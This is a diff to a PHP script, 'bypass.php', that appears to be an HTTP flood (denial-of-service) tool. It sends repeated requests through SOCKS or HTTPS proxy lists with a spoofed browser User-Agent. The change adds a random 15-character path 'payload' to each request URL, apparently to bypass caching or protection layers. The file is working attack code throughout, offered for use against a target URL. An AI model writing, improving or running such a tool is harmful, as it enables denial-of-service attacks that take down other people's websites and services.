@@ -18,7 +18,7 @@ $type = $argv[6];
 
 //Usage
 if($url == null || $requests == null || $timeout == null || $delay == null || $file == null || $type == null){
-	echo "Usage: php bypass.php <URL> <REQUESTS> <TIMEOUT TO CLOSE CONNECTION/3> <DELAY IN BETWEEN ATTACKS/3> <PROXIES.TXT> <HTTPS/SOCKS4/SOCKS5>\n";
+	echo "Usage: php bypass.php <URL> <REQUESTS> <TIMEOUT TO CLOSE CONNECTION/3> <DELAY IN BETWEEN ATTACKS/3> <PROXIES.TXT> <HTTPS/SOCKS4/SOCKS5>\n";	
 	die();
 }
 
@@ -27,6 +27,19 @@ $type = strtoupper($type);
 if($type == "SOCKS4") { $protocol = "socks4://"; }
 if($type == "SOCKS5") { $protocol = "socks5://"; }
 if($type == "HTTPS" || $type == "HTTP") { $protocol = ""; }
+
+
+//Payload
+function generateRandomString($length = 15) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+$payload = generateRandomString();
 
 echo "----------------------------------------------\n\n";
 
@@ -44,6 +57,7 @@ echo "[+] Target: $url\n";
 echo "[+] Timeout: $timeout\n";
 echo "[+] Delay: $delay\n";
 echo "[+] Proxy Type: $type\n";
+echo "[+] Payload: $payload\n";
 
 echo "----------------------------------------------\n";
 
@@ -69,7 +83,7 @@ for ($x = 1; $x <= 30; $x++) {
 		//Request 1
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_PROXY, ''.$protocol.''.$proxy.'');
-		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_URL, $url . '/' . $payload);
 		curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/'.$proxy.'.txt');
 		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
